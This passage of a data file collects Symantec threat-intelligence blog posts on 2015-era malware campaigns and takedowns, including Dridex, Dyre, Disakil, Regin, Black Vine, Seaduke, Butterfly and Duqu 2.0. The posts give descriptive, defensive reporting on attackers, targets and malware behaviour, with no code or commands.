campaigns spreading the Dridex Trojan. Western European countries, including France, Germany, Austria, and Switzerland also experienced high infection rates. The level of activity surrounding Dridex indicates that a large cybercrime group is behind the malware. The US Department of Justicehas said that the botnet is “run by criminals in Moldova and elsewhere.” In October 2015,an international law enforcement operationsaw one man charged alongside a coordinated effort to sinkhole thousands of compromised computers, cutting them off from the botnet’s control. It appears this may have only been a partial success as Dridex continues to propagate, indicating that many key elements of the operation are still functioning. The group is likely to continue to pose a serious threat during 2016. A multi-layered defense strategy maximizes protection against aggressive threats such as Dridex. The following Symantec and Norton products will help guard against infection: Intrusion prevention system detections For more information and a detailed analysis of the Dridex threat, read our whitepaper: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/dridex-financial-trojan-spam"
  },
  {
    "title": "dyre bank fraud group takedown",
    "content": "The cybercrime group controlling the Dyre financial fraud Trojan appears to have suffered a major blow followinga Russian law enforcement operation in November. Symantec telemetry has confirmed a virtual cessation of the group’s activities. Dyre (detected by Symantec as Infostealer.Dyre) is spread through email spam campaigns and no Dyre-related spam campaigns have been observed since November 18. Detections of the Dyre Trojan and associated malware have also dropped dramatically since mid-November. Dyre is primarily spread through email spam campaigns, most of which masquerade as business documents, voicemail, or fax messages. The Dyre group had been running email campaigns on most weekdays, dispatching between one and 15 separate email campaigns per day. However, Dyre-related spam campaigns halted abruptly on November 18 and none have been observed since then, indicating a major disruption in the group’s operations. Dyre spam campaigns come with a malicious attachment, which, if opened, will install the Upatre downloader on their computer (detected by Symantec as Downloader.Upatre). Upatre collects information about the victim’s computer, attempts to disable security software, and finally downloads and installs the Dyre Trojan. The Dyre group has been one of the main users of Upatre in over the past year. Symantec telemetry indicates a huge fall in the number of Upatre infections since November. The monthly infection rate has fallen below 20,000, after reaching a high of more than 250,000 per month in July 2015. The number of infections involving the Dyre Trojan itself has also dropped off significantly in the same period. The infection rate was running above 9,000 a month in early 2015. Since November it has fallen to below 600 per month. Prior to this takedown, Dyre had emerged as one of the most dangerous financial fraud operations. The Dyre Trojan is configured to defraud the customers of more than 1,000 banks and other companies worldwide. Consumers in English speaking countries, in particular the US and UK were most at risk, since this is where the largest numbers of targeted banks were located. Dyre targets Windows computers and can defraud victims by snooping on their online banking sessions, stealing their credentials, and sending them back to the attackers. Dyre is also used to infect victims with additional malware and Symantec has to date seen at least seven other malware families being pushed out to infected computers. In many cases, the victim is added to a botnet, which is then used to power further spam campaigns and infect more victims. The move against Dyre appears to be one of the most successful of a number of recent takedown operations against similar financial fraud threats. Unless all of the key figures are arrested and major infrastructure seized, cybercrime groups can quickly rebuild their operations in the aftermath of a law enforcement swoop. For example,an October 2015 operation against Dridex, one of the other major financial fraud Trojans currently in operation, appears to have had a limited impact on its operations. While one man was charged and thousands of compromised computers were sinkholed, the rate of Dridex infections did not abate following the takedown. Early indications are that the operation against Dyre has been quite successful, with no sign of the group attempting to re-establish itself. Whether the threat will disappear entirely will become apparent in the coming months. Intrusion Prevention System For more information on Dyre, see our whitepaper:Dyre: Emerging threat on financial fraud landscape The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/dyre-bank-fraud-group-takedown"
  },
  {
    "title": "destructive disakil malware ukraine",
    "content": "A highly destructive Trojan (detected by Symantec as Trojan.Disakil), reportedly used in recent attacks against the Ukrainian energy sector, was also earlier used against media targets in the same country. Symantec telemetry confirms that several computers in a major Ukrainian media company were compromised by Disakil in late October and may have been destroyed by the malware. One computer at the media company was compromised by a new variant of the BlackEnergy Trojan (detected by Symantec as Backdoor.Lancafdo). The attackers appear to have used this infection to retrieve administrator credentials and used them to execute Disakil on a number of computers.  Communication from these computers halted after Disakil was executed, suggesting that it succeeded in wiping them and rendering them inoperable. The group behind the Black Energy Trojan isknown as Sandworm and has a history of targeting organizations in Ukraine. It has also been known to attack NATO, a number of Western European countries, and companies operating in the energy sector. While Symantec does not have telemetry relating to more recent Disakil targets, the malware has been linked by others to attacks in late December against the energy sector in the Ukraine, which led to power outages in the country. Apress statementon theSecurity Service of Ukraine(SBU) website, alleged the discovery of malicious software responsible for these outages on the networks of regional power companies.  According to the SBU press statement, the cyberattack was accompanied by a barrage of phone calls to their technical support telephone numbers, which would have acted like a denial of service (DoS) attack. Ablogfrom the SANS ICS team meanwhile reported that it received a sample of Disakil from a trusted source which was used in one of the attacks, on December 23. While Symantec cannot confirm Disakil has been used in any cyberattack causing power outages at this time, we can confirm its destructive nature. Disakil is a multi-stage threat whose main characteristic is its appetite for destruction. If executed, it sets about rendering the infected system unusable by using a number of relatively simple but effective techniques such as overwriting the MBR (Master Boot Record) and overwriting certain file types with junk data. It also attempts to cover its tracks by clearing Windows log files and destroying the malware structure before restarting the system. A notable feature of Disakil is that it attempts to stop and delete a service named “sec_service”.   This service appears to belong to ‘Serial to Ethernet Connector’ software byEltima. This software allows access to remote serial ports over network connections.  A lot of legacy SCADA systems still use serial ports forRTU(Remote Terminal Unit or Remote Telemetry Unit) communications. This software is the type of solution a company would implement in their environment for communicating remotely with these legacy devices. According tomanufacturers, RTU features can include discrete alarms to monitor device failure, redundant backup communication for monitoring during a LAN failure and analog alarm inputs which monitor voltage, temperature, humidity and pressure.  Hypothetically, if an attacker knew that their target was using this software for communicating with their legacy SCADA devices, stopping the service and any communications would increase the potential for damage within their environment. Attacks of this nature against the energy sector are not unheard-of. In 2012 Symantec reported on theShamoon attacks, where at least one organization in the energy sector was attacked using very similar techniques to render the targeted system unusable. The destructive capabilities of Disakil would make it ideal for use in any attack looking to inflict severe damage to a target’s environment. ProtectionSymantec and Norton products protect against Disakil and related threats with the following detections: Intrusion prevention system The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/destructive-disakil-malware-ukraine"
  },
  {
    "title": "dridex takedown",
    "content": "An international law enforcement crackdown against the Dridex botnet has seen one man charged and a coordinated effort to sinkhole thousands of compromised computers, cutting them off from the botnet’s control. The operation, which involvedthe FBI in the US, the UK National Crime Agency, and a number of other international agencies, may seriously disrupt a cybercrime enterprise which has stolen tens of millions of dollars from victims worldwide. Dridex, which is detected by Symantec as W32.Cridex and also known as Bugat, is a financial threat that adds the infected computer to a botnet and injects itself into the victim’s web browser in order to steal information, including banking credentials. The malware is usually spread through phishing emails designed to appear to come from legitimate sources in order to lure the victim into opening a malicious attachment. It is also capable of self-replication by copying itself to mapped network drives and attached local storage such as USB keys. As is common with most financial attackers, the Dridex group regularly changed its tactics and most recently has been observed using malicious macros in Microsoft Office documents attached to emails to infect computers. As reported in Symantec’sState of financial Trojans 2014whitepaper, Dridex was the third-largest financial threat last year, accounting for some 29,000 detections. Nevertheless, this represented a decrease, with the number of infections down 88 percent since 2012. Recent telemetry suggests that the threat has enjoyed something of a resurgence in activity, with detections beginning to increase again in the past few months. The attackers behind Dridex have targeted a broad range of countries. The largest number of detections in 2015 was in the US. This was followed by Japan and Germany, with significant numbers of infections also seen in the UK, Canada, Australia, and a number of other European countries. Yesterday’s operation saw a 30-year-old Moldovan man charged by prosecutors in the US for offences including criminal conspiracy, unauthorized computer access with intent to defraud, damaging a computer, wire fraud, and bank fraud. His extradition to the US is currently being sought following his arrest in Cyprus in August. The FBI also obtained an injunction permitting it to start sinkholing Dridex infections by redirecting traffic from infected computers away from command-and-control (C&C) servers to benign substitute servers. This sinkholing operation is also being supported by the UK National Crime Agency. This is the latest in a series of recent takedowns against major financial fraud cybercrime groups, following earlier operations againstGameover Zeus,Shylock, andRamnit. Symantec and Norton products have the following protections against Dridex: Intrusion Prevention System The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/dridex-takedown"
  },
  {
    "title": "regin mysteries cyberespionage",
    "content": "Symantec’s continuing investigation into the Regin Trojan has cast new light on the cyberespionage tool, revealing a wider range of capabilities and a complex infrastructure supporting the threat. Regin was uncovered last year by Symantecand remains one of the most advanced spying tools discovered to date. The malware has been in circulation since at least 2008 and has been used against a range of targets, including government organizations, infrastructure operators, businesses, researchers, and private individuals. Regin is a five-stage threat, with each stage loading and decrypting the next one. The malware is modular in structure, which allows its controllers to add and remove specific features depending on the target. Some Regin modules control basic functions of the malware, such as networking or handling Regin’s encrypted virtual file system (EVFS). Other modules act as payloads, dictating the functionality of each Regin infection. As outlined in an updated technical whitepaper, Symantec has found 49 new modules, bringing the total number of Regin modules uncovered to 75. This remains an incomplete list. A number of other Regin payloads are known to exist since some modules analyzed contain references to them. Symantec has found an extensive command-and-control (C&C) infrastructure supporting Regin infections. The attackers have devised a complex system for communication with C&C servers, in which traffic is relayed through a network of Regin-infected computers. Compromised computers can act as a proxy for other infected computers and peer-to-peer (P2P) communications are used. The networking protocols used by the malware are extensible and can be configured between each pair of Regin-infected computers, providing the attackers with a granular level of control over C&C communications. All C&C communications use strong encryption and follow a two-stage protocol, where the attackers contact the infected computer on one channel and instruct it to open communications on another. A single Regin module (0009h) is responsible for the core handling of communications protocols, while each individual protocol has its own separate module. A total of six transport protocols have been identified: ICMP, UDP, TCP, HTTP Cookies, SSL, and SMB. Regin’s P2P communications capability sees each Regin infection assigned a virtual IP address, forming a virtual private network (VPN) on top of the physical network of the infected computer. This P2P capability allows the attackers to maintain deep access to critical assets within compromised organizations and mask core infrastructure belonging to the group. Traffic between nodes can be configured to match expected protocols based on where the nodes are placed on a network, adding a further degree of stealth to communications. Regin’s authors facilitate communication between modules with a lightweight remote procedure call (RPC) mechanism. This RPC mechanism appears to be custom-built. The RPC mechanism allows for procedure calls to be made locally and across the network of Regin-infected computers. Operators can directly call any procedure on the Regin network to remotely control, install, or update modules, or change module configuration by replacing EVFS files. Despite the threat’s exposure last year, it is unlikely that the group behind this malware has ceased operations. Its track record and available resources mean it is probable that the group will re-equip itself with a new threat or upgrade Regin in a bid to evade detection. The latter is the most likely course of action, given the time it would take to develop an equally capable malware framework from scratch. In terms of technical capabilities, Regin was several years ahead of most other threats. Its impact may continue to be felt as other, less advanced threat actors draw inspiration from it and copy its features in a bid to improve their own tools. Indicators of compromise for security administrators and more detailed technical information can be found in our updated technical paper−Regin: Top-tier espionage tool enables stealthy surveillance Symantec and Norton products detect this threat as Backdoor.Regin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/regin-mysteries-cyberespionage"
  },
  {
    "title": "black vine cyberespionage aerospace healthcare",
    "content": "Earlier this year, the second-largest health insurance provider in the US publicly disclosed that it had been the victim of a major cyberattack. The attack against Anthem resulted in the largest known healthcare data breach to date, with80 million patient records exposed. Symantec believes that the attackers behind the Anthem breach are part of a highly resourceful cyberespionage group called Black Vine. The Anthem attack is only one of multiple campaigns that Symantec has attributed to this group. Symantec’slatest whitepaperdocuments multiple Black Vine operations that have been occurring since 2012. Black Vine’s targets include gas turbine manufacturers, large aerospace and aviation companies, healthcare providers, and more. The group has access to zero-day exploits, most likely obtained through theElderwood framework, and uses custom-developed back door malware. By connecting multiple Black Vine campaigns, we traced how the attack group has evolved over the last three years. Black Vine’s attacks to date delivered exploits for the following zero-day vulnerabilities, primarily through watering-hole attacks: In its campaigns, Black Vine compromised legitimate websites that were of interest to its targets in order to serve exploits to the sites’ visitors. If the zero-day exploits successfully worked against the vulnerable software on the victim’s computer, then they dropped Black Vine’s custom malware, providing the attackers with remote access to the computer. In addition to watering-hole attacks, Black Vine also sent spear-phishing emails that disguised its threats using technology-themed lures. Black Vine has compromised companies in the following industries: The vast majority of Black Vine malware infections were located in the US, followed by China, Canada, Italy, Denmark, and India. Symantec observed Black Vine using three types of custom malware throughout its campaigns: Hurix and Sakurel (both detected as Trojan.Sakurel), and Mivast (detected as Backdoor.Mivast). All three threats can perform the following actions: Our analysis suggests that Black Vine is well resourced, as the group is capable of frequently updating and modifying its malware to avoid detection. During our analysis, we noticed that Black Vine used certain zero-day exploits at the same time that other attack groups used them. The other campaigns have been previously investigated by Symantec, such asone by Hidden Lynx. While these campaigns included the same zero-day exploits, they delivered different payloads unique to each attack group. The fact that these different adversaries simultaneously used the same exploits suggests that they all have access to a common zero-day exploit distribution framework. Symantec has previously identified the framework in question as the Elderwood platform. We first researched the platform in 2012 and observed how it has been continuously updated with the latest zero-day exploits ever since. In 2014, we discovered thatseveral attack groups were likely using the Elderwood framework, rather than just one. All of the campaigns that leveraged Elderwood’s zero-day exploits have been attributed to attackers based in China. Other reports suggestthat some of the actors involved in Black Vine’s activity may have had connections with a Beijing-based IT security firm called Topsec. Black Vine is a formidable, highly resourced attack group which is equipped to conduct cyberespionage against targeted organizations. Based on our records of its past campaigns, Symantec believes that Black Vine’s malicious activity will continue. We hope that our whitepaper will allow organizations to better understand the risk that this attack group poses, helping them to develop stronger defenses for their sensitive information. Symantec has the following detections in place to protect against Black Vine’s malware: Intrusion prevention system For a complete account of Symantec’s investigation into Black Vine and its campaigns,please read our whitepaper. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/black-vine-cyberespionage-aerospace-healthcare"
  },
  {
    "title": "forkmeiamfamous seaduke duke",
    "content": "Symantec has uncovered an elusive Trojan used by the cyberespionage group behind the “Duke” family of malware. Seaduke (detected by Symantec as Trojan.Seaduke) is a low-profile information-stealing Trojan which appears to be reserved for attacks against a small number of high-value targets. Seaduke has been used in attacks against a number of major, government-level targets. The malware hides behind numerous layers of encryption and obfuscation and is capable of quietly stealing and exfiltrating sensitive information such as email from the victim’s computer. Seaduke has a highly configurable framework and Symantec has already found hundreds of different configurations on compromised networks. Its creators are likely to have spent a considerable amount of time and resources in preparing these attacks and the malware has been deployed against a number of high-level government targets. While the Duke group began to distribute Cozyduke in an increasingly aggressive manner, Seaduke installations were reserved only for select targets. Seaduke victims are generally first infected with Cozyduke and, if the computer appears to be a target of interest, the operators will install Seaduke. The group behind Seaduke is a cyberespionage operation that is responsible for a series of attacks against high-profile individuals and organizations in government, international policy and private research in the United States and Europe. It has a range of malware tools at its disposal, known as the Dukes, including Cozyduke (Trojan.Cozer), Miniduke (Backdoor.Miniduke) and Cosmicduke (Backdoor.Tinybaron). News of the Duke group first emerged in  March and April of 2015, when reports detailing attacks involving a sophisticated threat actor variously called Office Monkeys,EuroAPT,Cozy Bear, andCozydukewere published. Symantec believes that this group has a history of compromising governmental and diplomatic organizations since at least 2010. The group began its current campaign as early as March 2014, when Trojan.Cozer (aka Cozyduke) was identified on the network of a private research institute in Washington, D.C. In the months that followed, the Duke group began to target victims with “Office Monkeys”- and “eFax”-themed emails, booby-trapped with a Cozyduke payload. These tactics were atypical of a cyberespionage group. It’s quite likely these themes were deliberately chosen to act as a smokescreen, hiding the true intent of the adversary. The Duke group has mounted an extended campaign targeting high-profile networks over extended periods, something which is far beyond the reach of the majority of threat actors. Its capabilities include: Although Cozyduke activity was first identified in March 2014, it wasn’t until July that the group managed to successfully compromise high-profile government networks. Cozyduke was used throughout these attacks to harvest and exfiltrate sensitive information to the attackers. In parallel, the Duke group was also installing separate malware onto these networks, namely Backdoor.Miniduke and the more elusive Trojan.Seaduke. It could use these payloads to exploit networks on multiple fronts and providing it with additional persistence mechanisms. In July of 2014, the group instructed Cozyduke-infected computers to install Backdoor.Miniduke onto a compromised network. Miniduke has been the group’s tool of choice for a number of years in espionage operations predominantly targeting government and diplomatic entities in Eastern Europe and ex-Soviet states.  “Nemesis Gemina” appears to be the internal name for the framework used by the group to identify the project, previously reported byKaspersky. The following debug string was present in the sample used in these attacks: This project name has been seen in Backdoor.Tinybaron (aka Cosmicduke) samples, which Symantec also attributes to the Duke group. This deployment of Miniduke and the technical similarities with Cozyduke provided strong indicators as to who was behind the attacks. These attacks were already well underway when another group began to deploy a previously unknown piece of malware. In October 2014, the Seaduke payload began to appear within target networks. Although Seaduke was developed in Python, the overall framework bears a striking resemblance to Cozyduke in terms of operation.  It’s unclear why the attackers waited until October to deploy Seaduke. Was it reserved for a more specific attack? Was part of their cover blown, necessitating the use of an alternative framework? The Seaduke framework was designed to be highly configurable. Hundreds of reconfigurations were identified on compromised networks. The communication protocol employed had many layers of encryption and obfuscation, using over 200 compromised web servers for command and control. Seaduke required a significant investment of time and resources in the preparatory and operational phases of the attack. The attackers control Cozyduke via compromised websites, issuing instructions to infected machines by uploading “tasks” to a database file. Cozyduke will periodically contact these websites to retrieve task information to be executed on the local machine.  One such task (an encoded PowerShell script) instructed Cozyduke to download and execute Seaduke from a compromised website. The attackers can operate Seaduke in a broadly similar fashion to Cozyduke. The Seaduke control infrastructure is essentially distinct, opening up the possibility of sub-teams concurrently exploiting the target network. Unlike Cozyduke, Seaduke operators upload “task” files directly to the command-and-control (C&C) server; there is no database as such present. Seaduke securely communicates with the C&C server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). To an untrained eye, the communications look fairly benign, no doubt an effort to stay under the radar on compromised networks. Seaduke has many inbuilt commands which are available to the attackers. They have the ability to retrieve detailed bot/system information, update bot configuration, upload files, download files, and self-delete the malware from the system. The self-delete function is interestingly called “seppuku”. This is a form of Japanese ritual suicide. The attackers have also developed a number of additional payloads. Operators can push these payloads onto infected machines for very specific attacks. The Duke group has brought its operational capability to the next level. Its attacks have been so bold and aggressive, that a huge amount of attention has been drawn to it, yet it appears to be unperturbed.  Its success at compromising such high-profile targets has no doubt added a few feathers to its cap. Even the developers reveled in this fact, naming one of Seaduke’s functions “forkmeiamfamous”. While the group is currently keeping a lower profile, there’s no doubt it will reappear. Some tools may have to be abandoned, some reworked and others built completely from scratch. This attack group is in it for the long haul. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/forkmeiamfamous-seaduke-duke"
  },
  {
    "title": "butterfly corporate attacks",
    "content": "Note:“Morpho” was used in the original publication to refer to this attack group. Symantec has renamed the group “Butterfly” to avoid any link whatsoever to other legitimate corporate entities named “Morpho” A corporate espionage group has compromised a string of major corporations over the past three years in order to steal confidential information and intellectual property. The gang, which Symantec calls Butterfly, is not-state sponsored, rather financially motivated. It has attacked multi-billion dollar companies operating in the internet, IT software, pharmaceutical, and commodities sectors. Twitter, Facebook, Apple, and Microsoft are among the companies who have publicly acknowledged attacks. Butterfly is technically proficient and well resourced. The group has developed a suite of custom malware tools capable of attacking both Windows and Apple computers, and appears to have used at least one zero-day vulnerability in its attacks. It keeps a low profile and maintains good operational security. After successfully compromising a target organization, it cleans up after itself before moving on to its next target. This group operates at a much higher level than the average cybercrime gang. It is not interested in stealing credit card details or customer databases and is instead focused on high-level corporate information. Butterfly may be selling this information to the highest bidder or may be operating as hackers for hire. Stolen information could also be used for insider-trading purposes. The first signs of Butterfly’s activities emerged in early 2013 when several major technology and internet firms were compromised.Twitter,Facebook,Appleand Microsoft disclosed that they had been compromised by very similar attacks. The attackers attacked victims by compromising a website used by mobile developers and using a Java zero-day exploit to infect them with malware. The malware used in these attacks was a Mac OS X back door known as OSX.Pintsized. Subsequent analysis by security researcher Eric Romang identified a Windows back door, Backdoor.Jiripbot, which was also used in the attacks. Following this flurry of publicity, the Butterfly group slipped back into the shadows. However, an investigation by Symantec has found that the group has been active since at least March 2012 and its attacks have not only continued to the present day, but have also increased in number. Symantec has to date discovered 49 different organizations in more than 20 countries that have been attacked by Butterfly. Over time, a picture has emerged of a cybercrime gang systematically targeting large corporations in order to steal confidential data. Aside from the four companies which have publicly acknowledged attacks, Symantec has identified five other large technology firms compromised by Butterfly, primarily headquartered in the US. However, technology is not the only sector the group has focused on and Symantec has found evidence that Butterfly has attacked three major European pharmaceutical firms. In the first attack, the attackers gained a foothold by first attacking a small European office belonging to one firm and using this infection to then move on to its US office and European headquarters. This template appeared to be followed in the two subsequent attacks on big pharma firms, with Butterfly compromising computers in a number of regional offices before being discovered. Butterfly has also shown an interest in the commodities sector, attacking two major companies involved in gold and oil in late 2014. In addition to this, the Central Asian offices of a global law firm were compromised in June 2015. The company specializes in finance and natural resources specific to that region. The latter was one of at least three law firms the group has targeted over the past three years. Butterfly appears to have a good working knowledge of the organizations it is attacking and is focused on stealing specific kinds of information. In many attacks, the group has succeeded in compromising Microsoft Exchange or Lotus Domino email servers in order to intercept company emails and possibly use them to send counterfeit emails. The group has also attacked enterprise content management systems, which would often be home to legal and policy documents, financial records, product descriptions, and training documents. In some instances, the group has zoned in on specialist systems. For example, one attack saw it gain access to a Physical Security Information Management (PSIM) system, which is used for managing and monitoring physical security systems, including swipe card access. This could have provided the attackers with access to CCTV feeds, allowing them to track the movement of people around buildings. Butterfly has a number of malware tools at its disposal, all of which appear to be internally developed. Each tool is well documented, indicating that a group rather than an individual is responsible for the attacks. Its primary tools are two back door Trojans. OSX.Pintsized is capable of opening a back door on Mac OS X computers. Its Windows counterpart is Backdoor.Jiripbot, which has shown signs of continuous development over the past two years, with various minor features being removed or added. Butterfly has also developed a number of its own hacking tools. Hacktool.Securetunnel is a modified version of OpenSSH which contains additional code to pass a command-and-control (C&C) server address and port to a compromised computer. Hacktool.Bannerjack is meanwhile used to retrieve default messages issued by Telnet, HTTP, and generic Transmission Control Protocol (TCP) servers. Symantec believes it is used to locate any potentially vulnerable servers on the local network, likely including printers, routers, HTTP servers, and any other generic TCP server. Butterfly uses Hacktool.Multipurpose to help it move across a compromised networking by editing event logs to hide activity, dumping passwords, securely deleting files, encrypting files, and carrying out basic network enumeration. The group uses Hacktool.Eventlog to parse event logs, dumping out ones of interest, and delete entries. It also kills processes and performs a secure self-delete. Hacktool.Proxy.A is used to create a proxy connection that allows attackers to route traffic through an intermediary node, onto their destination node. Based on the profile of the victims and the type of information targeted by the attackers, Symantec believes that Butterfly is financially motivated, stealing information it can potentially profit from. The group appears to be agnostic about the nationality of its targets, leading us to believe that Butterfly is unaffiliated to any nation state. The group’s malware is documented in fluent English, indicating that some of the group members, if not all, can speak the language. They also display some knowledge of English-speaking pop culture, such as using the meme AYBABTU (All your base are belong to us) as an encryption key in Backdoor.Jiripbot. Command-and-control server activity is highest at times that correspond to the US working day, which may suggest some or all of the group are operating in this region. However, this could also be accounted for by the fact that many of the group’s victims are located in the US. Butterfly may profit from its attacks in a number of ways. The group may be operating as “hackers for hire”, targeting corporations on request. Alternatively, it may select its own targets and either sell stolen information to the highest bidder or use it for insider-trading purposes. Butterfly is a disciplined, technically capable group with a high level of operational security. Having managed to increase its level of activity over the past three years while maintaining a low profile, the group poses a threat that ought to be taken seriously by corporations. Symantec and Norton products have the following protections against the Butterfly toolset: Intrusion prevention system For detailed technical analysis and indicators of compromise, please read our whitepaper:Butterfly: Corporate spies out for financial gain The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/butterfly-corporate-attacks"
  },
  {
    "title": "dyre financial trojan",
    "content": "The Dyre financial Trojan has emerged over the past year to become one of the most potent financial fraud tools in operation. Dyre is configured to defraud the customers of more than 1,000 banks and other companies worldwide. Consumers in English-speaking countries, in particular the US and UK, are most at risk, since this is where the largest numbers of targeted banks are located. After a number of recent takedowns against major financial threats such as Gameover Zeus, Shylock, and Ramnit, the threat posed by these groups has receded but Dyre has taken their place as one of the main threats to ordinary consumers. Detected by Symantec as Infostealer.Dyre, Dyre targets Windows computers and can steal banking and other credentials by attacking all three major web browsers (Internet Explorer, Chrome, and Firefox). Dyre is a two-pronged threat. Aside from stealing credentials, it can also be used to infect victims with other types of malware, such as adding them to spam botnets. A year of growthAs outlined in a newtechnical paperfrom Symantec Security Response published today, the number of Dyre infections began to surge a year ago and the attackers behind this malware have steadily improved its capabilities and continued to build out supporting infrastructure. Dyre is mainly spread using spam emails. In most cases, the emails masquerade as businesses documents, voicemail, or fax messages. If the victim clicks on an email’s attachment, they are redirected to a malicious website which will install the Upatre downloader on their computer (detected by Symantec as Downloader.Upatre). Upatre is one of the most popular reconnaissance/downloader tools used by financial fraud groups and has previously been employed by the Gameover Zeus and Cryptolocker gangs. Upatre acts as a bridgehead on the victim’s computer, collecting information about it, attempting to disable security software, and finally downloading and installing the Dyre Trojan. Dyre is capable of using several different types of man-in-the-browser (MITB) attacks against the victim’s web browser to steal credentials. One MITB attack involves scanning every web page visited and checking it against a list of sites that Dyre is pre-configured to attack. If a match is found, it redirects the victim to a fake website that looks similar to its genuine counterpart. This fake website will harvest the victim’s credentials before redirecting back to the genuine website. A second MITB attack allows Dyre to alter the way legitimate websites are displayed in the browser window by adding malicious code to it to steal the victim’s login credentials. In some scenarios, Dyre may also display an additional fake page informing the victim that their computer has not been recognized and that additional credentials need to be provided to verify their identity, such as their date of birth, PIN code, and credit card details. Dyre is also used to infect victims with further malware and Symantec has to date seen seven other malware families being pushed out to infected computers. In many cases, the victim is added to a botnet, which is then used to power further spam campaigns and infect more victims. Based on the times at which the Dyre attackers are most active, Symantec believes that the group is likely based in Eastern Europe or Russia. A large amount of the group’s command-and-control (C&C) infrastructure is located in these regions, but a relatively low number of infections occur in these countries. It is possible that the group may be attempting to keep a low profile by avoiding targets close to home. Symantec and Norton products detect these threats as: Other threats distributed by the Dyre Trojan are detected as: For detailed technical analysis and indicators of compromise, please read our whitepaperDyre: Emerging threat on financial fraud landscape. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/dyre-financial-trojan"
  },
  {
    "title": "duqu 20 cyberespionage",
    "content": "Duqu 2.0, the cyberespionage tool that was used to compromise security firm Kaspersky Lab, has also been used in a number of other attack campaigns against a range of targets, including several telecoms firms. Analysis by Symantec concurs withKaspersky’s assessment todaythat Duqu 2.0 (detected by Symantec as W32.Duqu.B) is an evolution of the older Duqu worm, which wasused in a number of intelligence-gathering attacks against a range of industrial targets before it was exposed in 2011. Although their functionalities were different, the original Duqu worm had many similarities with the Stuxnet worm used to sabotage the Iranian nuclear development program. Symantec has found evidence that Duqu has been used in a number of different attack campaigns against a small number of selected targets. Among the organizations targeted were a European telecoms operator, a North African telecoms operator, and a South East Asian electronic equipment manufacturer. Infections were also found on computers located in the US, UK, Sweden, India, and Hong Kong. In addition to the attack against itself, Kaspersky believes Duqu was used to target countries involved in international negotiations surrounding Iran’s nuclear program. Given the diversity of targets, Symantec believes that the Duqu attackers have been involved in multiple cyberespionage campaigns. Some organizations may not be the ultimate targets of the group’s operations, but rather stepping stones towards the final target. The group’s interest in telecoms operators could be related to attempts to monitor communications by individuals using their networks. Symantec has found no evidence to suggest that it has been affected by attacks using this malware. This new version of Duqu is stealthy and resides solely in the computer’s memory, with no files written to disk. It comes in two variants. The first is a basic back door that appears to be used to gain a persistent foothold inside the targeted entity by infecting multiple computers. The second variant is more complex. It has the same structure as the first, but contains several modules that provide a range of functionality to the malware, such as gathering information on the infected computer, stealing data, network discovery, network infection, and communication with command-and-control (C&C) servers. This variant appears to be deployed to computers deemed to be targets of interest by the attackers. Duqu and Duqu 2.0 share large amounts of code, in addition to similarities in how that code is organized. The shared code includes a number of helper functions. For example, as shown in Figure 1, there is a “gen_random” function (as labelled by an engineer) that is shared between Duqu and Duqu 2.0. Not only is that gen_random code shared, but the code that calls that function is also organized almost identically. Such similarities in how code is called is repeated in several other locations throughout Duqu 2.0, including in how C&C IP addresses are formatted, how network messages are generated, and how files are encrypted and decrypted. When a program needs to store data, the program author will design structures to store that data in a logical and easily accessible manner. Duqu and Duqu 2.0 share a number of these data structures. Another shared feature between the two variants, as shown in Figure 1, is the use of a cookie header with a hardcoded string and a random string when sending messages to a C&C server. For example: A second shared feature in the network communications code is to connect to a number of Microsoft URLs to retrieve a proxy address, as shown in Figure 2. The list of Microsoft URLs connected to, by both variants, is identical. Finally, for network communications, when Duqu uses HTTP, it will use image names in the “Content-Disposition” header. For Duqu, the value “DSC00001.jpg” was used, whereas for Duqu 2.0, the value “%05d.gif” is used. Based on our analysis, Symantec believes that Duqu 2.0 is an evolution of the original threat, created by the same group of attackers. Duqu 2.0 is a fully featured information-stealing tool that is designed to maintain a long term, low profile presence on the target’s network. Its creators have likely used it as one of their main tools in multiple intelligence gathering campaigns. Given that activity surrounding the original version of Duqu dropped off following its discovery, it is likely that the group may now retreat before re-emerging with new malware. Symantec and Norton products detect this threat as: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/duqu-20-cyberespionage"
  },
  {
    "title": "equation cyberespionage group",
